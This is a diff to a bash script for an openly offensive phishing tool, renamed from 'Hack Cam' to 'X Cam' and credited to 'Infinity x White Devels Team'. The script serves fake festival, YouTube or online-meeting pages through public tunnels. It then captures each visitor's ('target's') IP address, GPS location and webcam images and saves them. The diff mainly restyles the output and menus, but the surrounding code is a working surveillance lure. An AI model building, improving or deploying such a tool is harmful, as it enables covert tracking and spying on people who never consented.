@@ -39,29 +39,29 @@ check_windows
 banner() {
     clear
     printf "\n"
-    printf "\e[1;92m  ================================================================\e[0m\n"
-    printf "\e[1;92m  #\e[1;97m                                                               \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;32m   _   _            _     _____                      \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;32m  | | | | __ _  ___| | __|_   _|__  __ _ _ __ ___    \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;32m  | |_| |/ _\` |/ __| |/ /  | |/ _ \\/ _\` | '_ \` _ \\   \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;32m  |  _  | (_| | (__|   <   | |  __/ (_| | | | | | |  \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;32m  |_| |_|\\__,_|\\___|_|\\_\\  |_|\\___|\\__,_|_| |_| |_|  \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;97m                                                               \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;36m   >>  Webcam + GPS Capture  |  v3.0  <<                      \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[0;37m   Serveo & localhost.run | Kali | Termux | Ubuntu | Parrot   \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  #\e[1;32m   * \e[0mCreated by \e[1;97mInfinity x White Devels Team\e[0m \e[1;92m                            \e[1;92m#\e[0m\n"
-    printf "\e[1;92m  ================================================================\e[0m\n\n"
+    printf "\e[1;96m╔══════════════════════════════════════════════════════════════╗\e[0m\n"
+    printf "\e[1;96m║\e[1;97m                                                              \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;95m    __  __      ____                                      \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;95m   \ \/ /_ __ / ___|___  _ __ ___   ___ _ __ ___          \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;95m    \  /| '_ \\\\___ \  / _ \| '_ \` _ \ / _ \ '_ \` _ \\         \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;95m    /  \| | | |___) | (_) | | | | | |  __/ | | | | |        \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;95m   /_/\_\_| |_|____/ \___/|_| |_| |_|\___|_| |_| |_|        \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;97m                                                              \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;93m  ► Webcam + GPS Capture  |  v3.0                           \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[0;90m  Kali • Termux • Ubuntu • Parrot • macOS                    \e[1;96m║\e[0m\n"
+    printf "\e[1;96m║\e[1;95m  ★ Created by Infinity x White Devels Team                 \e[1;96m║\e[0m\n"
+    printf "\e[1;96m╚══════════════════════════════════════════════════════════════╝\e[0m\n\n"
 }
 dependencies() {
     if ! command -v php > /dev/null 2>&1; then
-        printf "\e[1;31m[!] PHP not found. Install: sudo apt install php\e[0m\n"
+        printf "\e[1;91m  [!] PHP not found. Run: sudo apt install php\e[0m\n"
         exit 1
     fi
     if ! command -v ssh > /dev/null 2>&1; then
-        printf "\e[1;31m[!] SSH not found. Install: sudo apt install ssh\e[0m\n"
+        printf "\e[1;91m  [!] SSH not found. Run: sudo apt install ssh\e[0m\n"
         exit 1
     fi
-    printf "\e[1;32m[*] Dependencies OK\e[0m\n"
+    printf "\e[1;92m  ✓ Ready\e[0m\n"
 }
 stop() {
     pkill -P $$ > /dev/null 2>&1
@@ -74,17 +74,17 @@ stop() {
         rm -f .monitor_pid
     fi
     rm -f sendlink ip.txt location_* LocationLog.log Log.log > /dev/null 2>&1
-    printf "\n\e[1;32m[*] Stopped. Hack Cam - Created by Infinity x White Devels Team\e[0m\n"
+    printf "\n\e[1;95m  X Cam - Created by Infinity x White Devels Team\e[0m\n"
     exit 1
 }
 catch_ip() {
     ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-    printf "\e[1;32m[+] IP:\e[0m %s\n" "$ip"
+    printf "\e[1;92m  ✓ IP:\e[0m %s\n" "$ip"
     cat ip.txt >> saved.ip.txt
 }
 catch_location() {
     if [[ -e "current_location.txt" ]]; then
-        printf "\e[1;32m[+] Current location data:\e[0m\n"
+        printf "\e[1;92m  ✓ Location:\e[0m\n"
         grep -v -E "Location data sent|getLocation called|Geolocation error" current_location.txt
         mv current_location.txt "saved_locations/$(date +%s).txt"
     elif [[ -e "location_"* ]]; then
@@ -93,35 +93,34 @@ catch_location() {
         lon=$(grep -a 'Longitude:' "$loc_file" | cut -d " " -f2)
         acc=$(grep -a 'Accuracy:' "$loc_file" | cut -d " " -f2)
         maps=$(grep -a 'Google Maps:' "$loc_file" | cut -d " " -f3)
-        printf "\e[1;32m[+] Latitude:\e[0m %s\n" "$lat"
-        printf "\e[1;32m[+] Longitude:\e[0m %s\n" "$lon"
-        printf "\e[1;32m[+] Accuracy:\e[0m %s meters\n" "$acc"
-        printf "\e[1;32m[+] Google Maps:\e[0m %s\n" "$maps"
+        printf "\e[1;92m     Lat:\e[0m %s \e[1;92mLon:\e[0m %s\n" "$lat" "$lon"
+        printf "\e[1;92m     Maps:\e[0m %s\n" "$maps"
         [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
         mv "$loc_file" "saved_locations/"
-        printf "\e[1;32m[*] Location saved.\e[0m\n"
+        printf "\e[1;92m  ✓ Saved\e[0m\n"
     else
-        printf "\e[1;33m[!] No location found.\e[0m\n"
+        printf "\e[1;91m  [!] No location found\e[0m\n"
     fi
 }
 checkfound() {
     [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
-    printf "\n\e[1;32m[*] Waiting for targets... Ctrl+C to exit.\e[0m\n"
-    printf "\e[1;32m[*] GPS tracking: ACTIVE\e[0m\n"
-    printf "\e[1;32m[*] Webcam capture: ACTIVE\e[0m\n"
+    printf "\n\e[1;96m  ═══════════════════════════════════════\e[0m\n"
+    printf "\e[1;92m  ✓ Waiting for targets... Ctrl+C to stop\e[0m\n"
+    printf "\e[1;92m  ✓ GPS + Webcam: ACTIVE\e[0m\n"
+    printf "\e[1;96m  ═══════════════════════════════════════\e[0m\n"
     while true; do
         if [[ -e "ip.txt" ]]; then
-            printf "\n\e[1;32m[+] Target opened the link!\e[0m\n"
+            printf "\n\e[1;92m  ✓ Target opened link!\e[0m\n"
             catch_ip
             rm -f ip.txt
         fi
         if [[ -e "LocationLog.log" ]] || [[ -e "current_location.txt" ]]; then
-            printf "\n\e[1;32m[+] Location data received!\e[0m\n"
+            printf "\n\e[1;92m  ✓ Location received!\e[0m\n"
             catch_location
             rm -f LocationLog.log
         fi
         if [[ -e "Log.log" ]]; then
-            printf "\n\e[1;32m[+] Camera image received!\e[0m\n"
+            printf "\n\e[1;92m  ✓ Camera image received!\e[0m\n"
             rm -f Log.log
         fi
         sleep 0.5
@@ -137,10 +136,10 @@ get_link_label() {
 }
 
 serveo_tunnel() {
-    printf "\e[1;32m[+] Starting PHP server...\e[0m\n"
+    printf "\e[1;93m  ► Starting server...\e[0m\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;32m[+] Starting Serveo tunnel (port 3333)...\e[0m\n"
+    printf "\e[1;93m  ► Starting tunnel...\e[0m\n"
     sub=""
     case "$option_tem" in
         1) sub=$(echo "$fest_name" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9' | head -c 12)
@@ -164,19 +163,21 @@ serveo_tunnel() {
         exit 1
     fi
     label=$(get_link_label "$link")
-    printf "\e[1;32m[*] Direct link:\e[0m %s\n" "$label"
+    printf "\n\e[1;96m  ─────────────────────────────────────\e[0m\n"
+    printf "\e[1;92m  ✓ Link:\e[0m %s\n" "$label"
+    printf "\e[1;96m  ─────────────────────────────────────\e[0m\n"
     echo "$link" > sendlink
     echo "$label" > share.txt
-    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; fi
-    if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null && printf "\e[1;32m[*] QR code generated (share.txt has inline link)\e[0m\n"; fi
+    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; fi
+    if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null; fi
     payload_template "$link"
     checkfound
 }
 localhost_run_tunnel() {
-    printf "\e[1;32m[+] Starting PHP server...\e[0m\n"
+    printf "\e[1;93m  ► Starting server...\e[0m\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;32m[+] Starting localhost.run tunnel...\e[0m\n"
+    printf "\e[1;93m  ► Starting tunnel...\e[0m\n"
     ssh -o StrictHostKeyChecking=accept-new -R 80:127.0.0.1:3333 nokey@localhost.run > localhostrun.log 2>&1 &
     ssh_pid=$!
     sleep 5
@@ -184,7 +185,7 @@ localhost_run_tunnel() {
         printf "\e[1;31m[!] localhost.run SSH failed to start.\e[0m\n"
         exit 1
     fi
-    printf "\e[1;32m[*] Waiting for tunnel URL...\e[0m\n"
+    printf "\e[1;93m  ► Waiting for URL...\e[0m\n"
     link=""
     attempts=0
     while [[ -z "$link" && $attempts -lt 20 ]]; do
@@ -199,10 +200,12 @@ localhost_run_tunnel() {
         exit 1
     fi
     label=$(get_link_label "$link")
-    printf "\e[1;32m[*] Direct link:\e[0m %s\n" "$label"
+    printf "\n\e[1;96m  ─────────────────────────────────────\e[0m\n"
+    printf "\e[1;92m  ✓ Link:\e[0m %s\n" "$label"
+    printf "\e[1;96m  ─────────────────────────────────────\e[0m\n"
     echo "$link" > sendlink
     echo "$label" > share.txt
-    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; fi
+    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;92m  ✓ Copied to clipboard\e[0m\n"; fi
     if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null; fi
     payload_template "$link"
     (
@@ -215,9 +218,9 @@ localhost_run_tunnel() {
             if [[ -f "localhostrun.log" ]]; then
                 new_url=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
                 if [[ -n "$new_url" && "$new_url" != "$last_url" ]]; then
-                    printf "\n\e[1;33m[!] URL CHANGED!\e[0m\n"
+                    printf "\n\e[1;93m  [!] URL changed:\e[0m\n"
                     label=$(get_link_label "$new_url")
-                    printf "\e[1;32m[*] New link:\e[0m %s\n" "$label"
+                    printf "\e[1;92m  ✓ %s\e[0m\n" "$label"
                     echo "$new_url" > sendlink
                     last_url="$new_url"
                     payload_template "$new_url"
@@ -264,29 +267,49 @@ payload_template() {
         sed "s|forwarding_link|$forwarding_link|g" OnlineMeeting.html > index.html
     fi
     if [[ -f "index.html" ]]; then
-        printf "\e[1;32m[*] Template generated successfully\e[0m\n"
+        printf "\e[1;92m  ✓ Template ready\e[0m\n"
     else
         printf "\e[1;31m[!] Error: Failed to generate index.html\e[0m\n"
         return 1
     fi
 }
 select_template() {
-    printf "\n  ----- Choose a Template -----\n"
-    printf "  [01] Festival Wishing\n"
-    printf "  [02] Live YouTube TV\n"
-    printf "  [03] Online Meeting\n"
-    read -p $'\n[+] Choose template [1]: ' option_tem
-    option_tem="${option_tem:-1}"
-    case "$option_tem" in
-          1) read -p '[+] Enter festival name: ' fest_name;
-              fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
-              read -p '[+] Style: 1)Indian  2)Islamic [1]: ' fest_variant
-              fest_variant="${fest_variant:-1}" ;;
-        2) read -p '[+] Enter YouTube video ID: ' yt_video_ID ;;
-        3) : ;;
-        *) printf "\e[1;33m[!] Invalid option!\e[0m\n"; sleep 1; select_template ;;
-    esac
+    while true; do
+        printf "\e[1;97m  [1] Festival Wishing\e[0m\n"
+        printf "\e[1;97m  [2] Live YouTube TV\e[0m\n"
+        printf "\e[1;97m  [3] Online Meeting\e[0m\n"
+        read -p $'\n\e[1;93m  ► Choose template [1]: \e[0m' option_tem
+        option_tem="${option_tem:-1}"
+        case "$option_tem" in
+            1) read -p $'\e[1;93m  ► Festival name: \e[0m' fest_name;
+               fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
+               [[ -z "$fest_name" ]] && fest_name="Festival"
+               read -p $'\e[1;93m  ► Style: [1]Indian  [2]Islamic [1]: \e[0m' fest_variant
+               fest_variant="${fest_variant:-1}"
+               break ;;
+            2) read -p $'\e[1;93m  ► YouTube video ID: \e[0m' yt_video_ID;
+               [[ -z "$yt_video_ID" ]] && yt_video_ID="dQw4w9WgXcQ"
+               break ;;
+            3) break ;;
+            *) printf "\e[1;91m  [!] Invalid. Enter 1, 2 or 3\e[0m\n"; sleep 1 ;;
+        esac
+    done
 }
+choose_tunnel() {
+    while true; do
+        printf "\n\e[1;96m  ─────── Step 2/2: Tunnel ───────\e[0m\n"
+        printf "\e[1;97m  [1] Serveo.net \e[0;90m(fast)\e[0m\n"
+        printf "\e[1;97m  [2] localhost.run \e[0;90m(backup)\e[0m\n"
+        read -p $'\n\e[1;93m  ► Choose [1]: \e[0m' option_server
+        option_server="${option_server:-1}"
+        case "$option_server" in
+            1) serveo_tunnel; return ;;
+            2) localhost_run_tunnel; return ;;
+            *) printf "\e[1;91m  [!] Invalid. Enter 1 or 2\e[0m\n"; sleep 1 ;;
+        esac
+    done
+}
+
 main_flow() {
     if [[ -f ".monitor_pid" ]]; then
         old_monitor=$(cat .monitor_pid 2>/dev/null)
@@ -294,17 +317,9 @@ main_flow() {
         rm -f .monitor_pid
     fi
     rm -f sendlink ip.txt serveo.log localhostrun.log
+    printf "\n\e[1;96m  ─────── Step 1/2: Template ───────\e[0m\n"
     select_template
-    printf "\n  ----- Choose Tunneling Service -----\n"
-    printf "  [01] Serveo.net (fast)\n"
-    printf "  [02] localhost.run (backup)\n"
-    read -p $'\n[+] Choose tunnel [1]: ' option_server
-    option_server="${option_server:-1}"
-    case "$option_server" in
-        1) serveo_tunnel ;;
-        2) localhost_run_tunnel ;;
-        *) printf "\e[1;33m[!] Invalid option!\e[0m\n"; sleep 1; main_flow ;;
-    esac
+    choose_tunnel
 }
 banner
 dependencies
